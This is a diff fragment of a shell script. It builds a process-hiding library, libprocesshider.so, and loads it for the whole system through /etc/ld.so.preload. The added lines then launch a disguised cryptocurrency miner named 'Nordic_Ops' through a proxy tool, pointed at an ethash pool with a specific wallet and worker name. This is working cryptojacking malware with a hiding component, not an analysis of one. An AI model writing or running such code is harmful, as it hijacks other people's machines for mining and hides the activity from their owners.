@@ -44,3 +44,5 @@ make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./graftcp/graftcp -w --whiteip-file=ips.txt prog ./Nordic_Ops --algo ethash --hostname eth-eu1.hellominer.com --port 1100 --wallet 0x587bdded4037bba7c74fb6af2f6e296bb2f8415d --worker-name Black_Dick
